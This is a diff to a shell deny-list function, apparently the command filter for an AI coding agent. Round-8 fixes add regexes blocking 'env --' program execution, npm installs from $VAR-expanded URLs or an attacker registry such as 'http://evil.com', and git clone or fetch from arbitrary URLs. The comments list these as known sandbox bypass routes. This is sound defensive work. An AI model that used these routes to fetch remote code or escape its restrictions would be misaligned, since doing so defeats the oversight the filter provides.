@@ -130,16 +130,22 @@ flag_denied() {
     echo "git -c with alias/core.sshCommand/core.editor/core.pager (shell-execution config) not allowed"
     return 0
   fi
-  # Round-7 L3 — `env <prog>` runs <prog> as a program. Restrict env to
-  # introspection-only (no positional command). Allowed: `env`, `env | grep
-  # X`, `env VAR=value` (no command after), `env -i`. Denied: `env <verb>`
-  # where <verb> is anything not VAR=value or a flag.
+  # Round-7 L3 + round-8 M1 — `env <prog>` runs <prog> as a program.
+  # Restrict env to introspection-only (no positional command). M1
+  # additionally denies `env -- <prog>` (POSIX end-of-options separator).
   # Regex: env, optionally followed by flag-OR-assignment groups, then a
   # required positional that looks like a program name (starts alpha/./_,
   # contains no `=`). Positional starting with `-` is excluded so flags
   # don't false-positive.
   if echo "$seg" | grep -qE '(^|[[:space:];&|])env([[:space:]]+(-[a-zA-Z0-9]+|[A-Z_][A-Z0-9_]*=[^[:space:]]*))*[[:space:]]+[a-zA-Z./_][^=[:space:]]*([[:space:]]|$)'; then
     echo "env invoking a program (env <prog>) not allowed; use the program directly via an allowlisted verb"
+    return 0
+  fi
+  # M1 — `env --` (end-of-options separator). Anything after `--` is
+  # positional, which we want to deny. Easier to deny `env --` outright
+  # since legitimate env usage never needs `--`.
+  if echo "$seg" | grep -qE '(^|[[:space:];&|])env([[:space:]]+(-[a-zA-Z0-9]+|[A-Z_][A-Z0-9_]*=[^[:space:]]*))*[[:space:]]+--([[:space:]]|$)'; then
+    echo "env -- (end-of-options separator) not allowed; everything after -- is a program invocation"
     return 0
   fi
   # Round-7 L5 — `npx <url>` and `npm install <url|file>` download and
@@ -151,6 +157,32 @@ flag_denied() {
   fi
   if echo "$seg" | grep -qE '(^|[[:space:];&|])(npm|pnpm|yarn|bun)[[:space:]]+(install|i|add)[[:space:]]+(-[a-zA-Z][[:space:]]+|--[a-zA-Z-]+([[:space:]]+|=)[^[:space:]]+[[:space:]]+)*((https?:|file:|git\+|/|\./|\.\.\/))'; then
     echo "npm/pnpm/yarn install with URL/path arg not allowed; use registry package specs only"
+    return 0
+  fi
+  # M2 (round-8) — deferred variable expansion. `npm install $URL` where
+  # $URL was previously assigned to a URL bypasses L5 because the literal
+  # cmd has `$URL`, not `http://...`. Deny any unquoted `$VAR` in install
+  # args.
+  if echo "$seg" | grep -qE '(^|[[:space:];&|])(npm|pnpm|yarn|bun|npx|bunx)[[:space:]]+((install|i|add|dlx|exec)[[:space:]]+)?[^|;&]*\$[A-Za-z_{]'; then
+    echo "npm/npx with \$VAR-expanded argument not allowed (deferred URL expansion); use literal package specs"
+    return 0
+  fi
+  # M3 (round-8) — `npm install pkg --registry http://evil.com` uses an
+  # attacker-controlled registry. Deny --registry/--config flags with
+  # non-allowlisted hosts. The fix is conservative: deny --registry
+  # entirely (the agent should use the project's package-lock.json /
+  # default registry).
+  if echo "$seg" | grep -qE '(^|[[:space:];&|])(npm|pnpm|yarn|bun|npx|bunx)[[:space:]]+[^|;&]*--(registry|config[[:space:]]+set[[:space:]]+registry|@[^=]+:registry)([[:space:]]+|=)'; then
+    echo "npm/npx --registry not allowed; use the project's default registry"
+    return 0
+  fi
+  # M4 (round-8) — `git clone/fetch/pull/ls-remote/remote add <url>` with
+  # arbitrary URLs reaches attacker hosts and can trigger protocol-level
+  # RCE (CVE-2018-17456 etc.). Deny when the verb is followed by a URL.
+  # The project's own remote operations (git fetch with no arg, git pull
+  # with no arg) still work — they use the configured remote.
+  if echo "$seg" | grep -qE '(^|[[:space:];&|])git[[:space:]]+(-c[[:space:]]+[^[:space:]]+[[:space:]]+)*(clone|fetch|pull|ls-remote|remote[[:space:]]+(add|set-url))[[:space:]]+[^|;&]*(https?://|git@|ssh://|git://|ftp://)'; then
+    echo "git clone/fetch/pull/ls-remote with arbitrary URL not allowed; use the configured remote (git fetch with no args)"
     return 0
   fi
   # Round-7 L6 — find -exec / -delete / -execdir / -fprint{,f} / -fls
